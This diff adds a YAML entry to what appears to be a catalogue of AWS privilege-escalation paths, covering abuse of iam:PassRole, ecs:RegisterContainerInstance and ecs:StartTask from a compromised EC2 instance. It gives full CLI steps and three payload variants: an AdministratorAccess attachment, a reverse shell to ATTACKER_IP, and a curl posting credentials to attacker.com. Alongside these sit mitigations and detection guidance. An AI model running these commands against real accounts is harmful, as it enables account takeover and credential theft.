@@ -1,0 +1,434 @@
+id: ecs-007
+name: iam:PassRole + ecs:StartTask + ecs:RegisterContainerInstance
+category: new-passrole
+services:
+  - iam
+  - ecs
+  - ec2
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must cover both the task role ARN (for the taskRoleArn override) and the execution role ARN defined in the existing task definition — ECS requires PassRole on the execution role even when it is not being changed
+    - permission: ecs:RegisterContainerInstance
+      resourceConstraints: Must be able to register an EC2 instance to an existing ECS cluster via direct API call using IMDS identity documents
+    - permission: ecs:StartTask
+      resourceConstraints: Must have permission to start tasks on container instances in the target cluster
+  additional:
+    - permission: ecs:ListClusters
+      resourceConstraints: Helpful for finding the target cluster name
+    - permission: ecs:ListContainerInstances
+      resourceConstraints: Helpful for verifying container instance registration and retrieving instance ARNs
+    - permission: ecs:ListTaskDefinitions
+      resourceConstraints: Helpful for discovering existing task definitions to exploit
+    - permission: ecs:DescribeTasks
+      resourceConstraints: Helpful for monitoring task execution status
+    - permission: ecs:DeregisterContainerInstance
+      resourceConstraints: Helpful for cleaning up the orphaned direct-API registration after the ECS agent creates its own registration; the attack succeeds without it
+    - permission: ec2:DescribeSubnets
+      resourceConstraints: Helpful for finding subnets if network configuration is needed
+    - permission: ec2:DescribeSecurityGroups
+      resourceConstraints: Helpful for finding security groups if network configuration is needed
+
+description: An EC2 instance role with `iam:PassRole`, `ecs:RegisterContainerInstance`, and `ecs:StartTask` can be exploited when the attacker has Remote Code Execution (RCE) on the EC2 instance. The attacker retrieves the EC2 instance identity document and signature from IMDS, then calls `ecs:RegisterContainerInstance` directly via the API to register the instance to a target ECS cluster — without going through the ECS agent. Next, the attacker reconfigures the ECS agent to point to the target cluster and restarts it. Once the agent reconnects with full capability attributes, the attacker calls `ecs:StartTask` with `--overrides` to run an existing task definition with a malicious container command and a privileged `taskRoleArn` passed via `iam:PassRole`. This technique requires no `ecs:RegisterTaskDefinition` — the `--overrides` parameter hijacks an existing task definition to execute arbitrary commands with the passed role's permissions.
+
+prerequisites:
+  admin:
+    - Attacker has Remote Code Execution (RCE) on an EC2 instance whose instance role has the required permissions
+    - An ECS cluster must exist in the account
+    - An existing task definition must be available in the cluster
+    - A role must exist that trusts ecs-tasks.amazonaws.com with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - Attacker has Remote Code Execution (RCE) on an EC2 instance whose instance role has the required permissions
+    - An ECS cluster must exist in the account
+    - An existing task definition must be available in the cluster
+    - A role must exist that trusts ecs-tasks.amazonaws.com
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: aws sts get-caller-identity
+      description: Verify identity on the compromised EC2 instance using the instance role's IMDS credentials
+    - step: 2
+      command: |
+        IDENTITY_DOC=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document)
+        IDENTITY_SIG=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature | tr -d '\n')
+        TOTAL_CPU=$(($(nproc --all) * 1024))
+        TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024)}')
+      description: Retrieve the EC2 instance identity document and PKCS7 signature from IMDS — these are used as proof of identity when calling ecs:RegisterContainerInstance
+    - step: 3
+      command: |
+        aws ecs register-container-instance \
+          --cluster TARGET_CLUSTER \
+          --instance-identity-document "$IDENTITY_DOC" \
+          --instance-identity-document-signature "$IDENTITY_SIG" \
+          --total-resources "[{\"name\":\"CPU\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_CPU},{\"name\":\"MEMORY\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_MEM}]" \
+          --query 'containerInstance.containerInstanceArn' \
+          --output text
+      description: Register the EC2 instance to the target ECS cluster by calling ecs:RegisterContainerInstance directly via the API using the IMDS identity documents — this bypasses the ECS agent entirely for the initial registration
+    - step: 4
+      command: |
+        sed -i 's/CURRENT_CLUSTER/TARGET_CLUSTER/' /etc/ecs/ecs.config
+        echo ECS_ENABLE_TASK_IAM_ROLE=true >> /etc/ecs/ecs.config
+        systemctl restart ecs
+      description: Reconfigure the ECS agent to connect to the target cluster and enable task IAM role support, then restart the agent so it reconnects with full capability attributes (Docker version, OS type, networking) needed for task placement
+    - step: 5
+      command: |
+        aws ecs list-container-instances \
+          --cluster TARGET_CLUSTER \
+          --query 'containerInstanceArns' \
+          --output json
+      description: Wait for the ECS agent to reconnect (agentConnected=true) and retrieve the agent-connected container instance ARN — use ecs:describe-container-instances to confirm the agent is connected before proceeding
+    - step: 6
+      command: |
+        aws ecs list-task-definitions \
+          --query 'taskDefinitionArns' \
+          --output json
+      description: Discover existing task definitions to exploit using the --overrides parameter — ecs:RegisterTaskDefinition is not required
+    - step: 7
+      command: |
+        aws ecs start-task \
+          --cluster TARGET_CLUSTER \
+          --task-definition EXISTING_TASK_DEFINITION \
+          --container-instances CONTAINER_INSTANCE_ARN \
+          --overrides '{
+            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+            "containerOverrides": [{
+              "name": "CONTAINER_NAME",
+              "command": ["iam", "attach-role-policy", "--role-name", "INSTANCE_ROLE_NAME", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+            }]
+          }'
+      description: Start the existing task definition on the registered container instance, overriding the task role ARN via iam:PassRole and the container command with a payload that escalates the instance role's privileges
+    - step: 8
+      command: aws ecs describe-tasks --cluster TARGET_CLUSTER --tasks TASK_ARN
+      description: Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative task roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ecs-tasks.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+
+  - Restrict `ecs:RegisterContainerInstance` on EC2 instance roles — this permission allows self-registration to any cluster and is not needed for workloads that are not ECS container instances
+  - Restrict `ecs:StartTask` and `ecs:RegisterContainerInstance` to specific cluster ARNs rather than wildcard resources
+  - Monitor CloudTrail for `ecs:RegisterContainerInstance` calls originating from EC2 instance roles, especially to clusters where the instance is not expected to register
+  - Monitor CloudTrail for ECS task execution with task role ARN overrides (`taskRoleArn` in the overrides field)
+  - Monitor CloudTrail for roles being passed to ECS tasks that haven't been used before
+  - Monitor and alert on ECS task execution with privileged roles passed via `--overrides`
+  - Regularly audit EC2 instance roles for `ecs:RegisterContainerInstance` and `ecs:StartTask` permissions — these are high-risk when combined with `iam:PassRole`
+  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.
+
+  This path requires the attacker to already have Remote Code Execution (RCE) on an EC2 instance with the appropriate instance role permissions — a significant prerequisite compared to paths that only require an IAM user or role. In practice, this scenario arises when an EC2 instance running a vulnerable web application or workload has an overly permissive instance role.
+
+discoveryAttribution:
+  firstDocumented:
+    source: ReverseC Labs
+    date: 2025
+    link: https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path
+
+references:
+  - title: "Another ECS Privilege Escalation Path"
+    url: "https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path"
+  - title: "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers"
+    url: "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
+
+relatedPaths:
+  - ecs-005
+  - ecs-008
+  - ecs-009
+
+detectionTools:
+  prowler: https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L243
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/iam-passrole+ecs-starttask+ecs-registercontainerinstance"
+    description: "Deploy Terraform into your own AWS account to practice this attack path"
+
+attackVisualization:
+  nodes:
+  - id: start
+    label: Compromised EC2 Instance Role
+    type: principal
+    description: |
+      The attacker has Remote Code Execution (RCE) on an EC2 instance whose instance role holds iam:PassRole, ecs:RegisterContainerInstance, ecs:StartTask, and the ECS agent operational permissions (ecs:DiscoverPollEndpoint, ecs:Poll, ecs:SubmitTaskStateChange, ecs:SubmitContainerStateChange). The RCE gives the attacker the ability to make API calls using the instance role's credentials and to reconfigure software running on the instance (specifically the ECS agent).
+
+  - id: existing_cluster
+    label: Existing ECS Cluster
+    type: resource
+    description: |
+      An existing ECS cluster in the account. The attacker calls ecs:RegisterContainerInstance directly via the API — without going through the ECS agent — by presenting the EC2 instance identity document and PKCS7 signature retrieved from IMDS as proof of identity.
+
+      The identity document and signature are retrieved with:
+      ```bash
+      IDENTITY_DOC=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document)
+      IDENTITY_SIG=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature | tr -d '\n')
+      TOTAL_CPU=$(($(nproc --all) * 1024))
+      TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024)}')
+      ```
+
+      This step registers the EC2 instance as a container instance in the target cluster, making it eligible to receive task placements.
+
+  - id: registered_instance
+    label: Registered EC2 Container Instance
+    type: resource
+    description: |
+      The EC2 instance is now registered to the target cluster. The attacker then reconfigures the ECS agent (already running on the instance) to connect to the target cluster and restarts it. Once the agent reconnects, it reports full capability attributes (Docker version, OS type, networking), making the instance ready for task placement.
+
+      Agent reconfiguration commands:
+      ```bash
+      sed -i 's/CURRENT_CLUSTER/TARGET_CLUSTER/' /etc/ecs/ecs.config
+      echo ECS_ENABLE_TASK_IAM_ROLE=true >> /etc/ecs/ecs.config
+      systemctl restart ecs
+      ```
+
+      The attacker waits for agentConnected=true to confirm the agent is fully reconnected before proceeding.
+
+  - id: target_role
+    label: Existing Role That Trusts the ECS Tasks Service
+    type: principal
+    description: |
+      The IAM role passed to the running task via the taskRoleArn override in ecs:StartTask. This role must trust ecs-tasks.amazonaws.com. Unlike standard PassRole paths where a new resource is created to host the role, here the role is injected into an existing task definition's execution via the --overrides parameter — no ecs:RegisterTaskDefinition is required.
+
+      The task automatically assumes this role on startup. The role's temporary credentials are available to the container process via the ECS credentials endpoint injected into the container's environment.
+
+  - id: method_direct
+    label: 'Method 1: Container Command Override (Direct Elevation)'
+    type: payload
+    color: '#99ccff'
+    description: |
+      The attacker specifies a malicious containerOverrides command in the ecs:StartTask call that directly elevates the starting principal by executing IAM modifications using the passed role's credentials. The container runs the command immediately on startup.
+
+      Example --overrides payload that attaches AdministratorAccess to the instance role:
+      ```bash
+      aws ecs start-task \
+        --cluster TARGET_CLUSTER \
+        --task-definition EXISTING_TASK_DEFINITION \
+        --container-instances CONTAINER_INSTANCE_ARN \
+        --overrides '{
+          "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+          "containerOverrides": [{
+            "name": "CONTAINER_NAME",
+            "command": ["iam", "attach-role-policy",
+              "--role-name", "INSTANCE_ROLE_NAME",
+              "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+          }]
+        }'
+      ```
+
+      This approach requires the target role to have IAM write permissions but is the most direct path to full escalation.
+
+  - id: method_reverse_shell
+    label: 'Method 2: Container Command Override (Reverse Shell)'
+    type: payload
+    color: '#99ccff'
+    description: |
+      The attacker overrides the container command to establish a reverse shell connection to an attacker-controlled listener. This provides interactive access inside the ECS task container, where the ECS credentials endpoint (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI) supplies the passed role's temporary credentials automatically.
+
+      Example --overrides payload for a reverse shell:
+      ```bash
+      aws ecs start-task \
+        --cluster TARGET_CLUSTER \
+        --task-definition EXISTING_TASK_DEFINITION \
+        --container-instances CONTAINER_INSTANCE_ARN \
+        --overrides '{
+          "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+          "containerOverrides": [{
+            "name": "CONTAINER_NAME",
+            "command": ["/bin/sh", "-c",
+              "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
+          }]
+        }'
+      ```
+
+      The attacker maintains a listener (e.g., nc -lvnp 4444). Once connected, AWS CLI commands issued inside the container automatically use the passed role's credentials.
+
+  - id: method_exfiltration
+    label: 'Method 3: Container Command Override (Credential Exfiltration)'
+    type: payload
+    color: '#99ccff'
+    description: |
+      The attacker overrides the container command to retrieve the passed role's temporary credentials from the ECS credentials endpoint and exfiltrate them to an attacker-controlled server. This is a fire-and-forget approach that does not require maintaining an interactive connection.
+
+      Inside ECS tasks, credentials are available via the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI environment variable injected by the ECS agent:
+      ```bash
+      aws ecs start-task \
+        --cluster TARGET_CLUSTER \
+        --task-definition EXISTING_TASK_DEFINITION \
+        --container-instances CONTAINER_INSTANCE_ARN \
+        --overrides '{
+          "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+          "containerOverrides": [{
+            "name": "CONTAINER_NAME",
+            "command": ["/bin/sh", "-c",
+              "curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -X POST https://attacker.com/exfil -d @-"]
+          }]
+        }'
+      ```
+
+      The attacker receives the AccessKeyId, SecretAccessKey, and SessionToken remotely and can use them from their own environment.
+
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    description: |
+      The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages the passed role's permissions to gain full administrative access to the AWS account.
+
+  - id: some_perms
+    label: Some additional access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      The target role has elevated but non-administrative permissions. Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.
+
+  - id: no_access
+    label: No additional access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      The target role only has minimal permissions (e.g., logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides limited value.
+
+  edges:
+  - from: start
+    to: existing_cluster
+    label: ecs:RegisterContainerInstance
+    description: |
+      The attacker calls ecs:RegisterContainerInstance directly via the API using IMDS identity documents as proof of identity. This bypasses the ECS agent for the initial registration step and adds the EC2 instance to the target cluster.
+
+      Command:
+      ```bash
+      aws ecs register-container-instance \
+        --cluster TARGET_CLUSTER \
+        --instance-identity-document "$IDENTITY_DOC" \
+        --instance-identity-document-signature "$IDENTITY_SIG" \
+        --total-resources "[{\"name\":\"CPU\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_CPU},{\"name\":\"MEMORY\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_MEM}]" \
+        --query 'containerInstance.containerInstanceArn' \
+        --output text
+      ```
+
+  - from: existing_cluster
+    to: registered_instance
+    label: ECS agent reconfigured and reconnects
+    description: |
+      After the API-level registration, the attacker reconfigures the ECS agent on the EC2 instance to point to the target cluster and restarts it. The agent reconnects with full capability attributes (Docker version, OS type, networking) required for task placement. The attacker confirms the agent is connected (agentConnected=true) before proceeding.
+
+  - from: registered_instance
+    to: target_role
+    label: iam:PassRole + ecs:StartTask
+    description: |
+      The attacker calls ecs:StartTask targeting the registered container instance and specifies the --overrides parameter to inject both the privileged taskRoleArn (via iam:PassRole) and a malicious container command. No new task definition is registered — an existing task definition is exploited through the override mechanism.
+
+      The running ECS task automatically assumes the passed role. Temporary credentials are injected into the container via the ECS credentials endpoint (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI).
+
+  - from: target_role
+    to: method_direct
+    label: Option A
+    branch: A
+    description: |
+      Choose the direct elevation approach: override the container command to execute IAM modifications using the passed role's credentials, directly elevating the instance role or another principal.
+
+  - from: target_role
+    to: method_reverse_shell
+    label: Option B
+    branch: B
+    description: |
+      Choose the reverse shell approach: override the container command to establish an interactive reverse shell inside the ECS task container, where the passed role's credentials are available via the ECS credentials endpoint.
+
+  - from: target_role
+    to: method_exfiltration
+    label: Option C
+    branch: C
+    description: |
+      Choose the credential exfiltration approach: override the container command to retrieve the passed role's temporary credentials from the ECS credentials endpoint and send them to an attacker-controlled server.
+
+  - from: method_direct
+    to: admin
+    label: If target role has admin or IAM write permissions
+    branch: A1
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess or permissions to modify IAM (such as iam:AttachRolePolicy, iam:PutRolePolicy, iam:CreateAccessKey), the container command successfully escalates the starting principal to administrator.
+
+  - from: method_direct
+    to: some_perms
+    label: If target role has some elevated permissions
+    branch: A2
+    condition: some_permissions
+    description: |
+      If the target role has elevated permissions but not IAM write access, the container command can leverage those permissions for data access or other attacks, but cannot directly modify IAM to elevate the starting principal.
+
+  - from: method_direct
+    to: no_access
+    label: If target role has minimal permissions
+    branch: A3
+    condition: no_permissions
+    description: |
+      If the target role only has minimal permissions, the container command cannot perform meaningful escalation actions.
+
+  - from: method_reverse_shell
+    to: admin
+    label: If target role has admin permissions
+    branch: B1
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess, the reverse shell provides interactive access with full administrative permissions. The attacker can execute any AWS API call from inside the container.
+
+  - from: method_reverse_shell
+    to: some_perms
+    label: If target role has some elevated permissions
+    branch: B2
+    condition: some_permissions
+    description: |
+      If the target role has elevated permissions, the reverse shell allows the attacker to interactively explore and leverage those permissions for data access or further attacks.
+
+  - from: method_reverse_shell
+    to: no_access
+    label: If target role has minimal permissions
+    branch: B3
+    condition: no_permissions
+    description: |
+      If the target role only has minimal permissions, the reverse shell provides limited value despite offering interactive access.
+
+  - from: method_exfiltration
+    to: admin
+    label: If target role has admin permissions
+    branch: C1
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess, the exfiltrated credentials provide full administrative access that can be used from the attacker's own environment.
+
+  - from: method_exfiltration
+    to: some_perms
+    label: If target role has some elevated permissions
+    branch: C2
+    condition: some_permissions
+    description: |
+      If the target role has elevated permissions, the exfiltrated credentials can be used for data access, reconnaissance, or additional privilege escalation attempts from the attacker's environment.
+
+  - from: method_exfiltration
+    to: no_access
+    label: If target role has minimal permissions
+    branch: C3
+    condition: no_permissions
+    description: |
+      If the target role only has minimal permissions, the exfiltrated credentials provide limited value for further attacks.
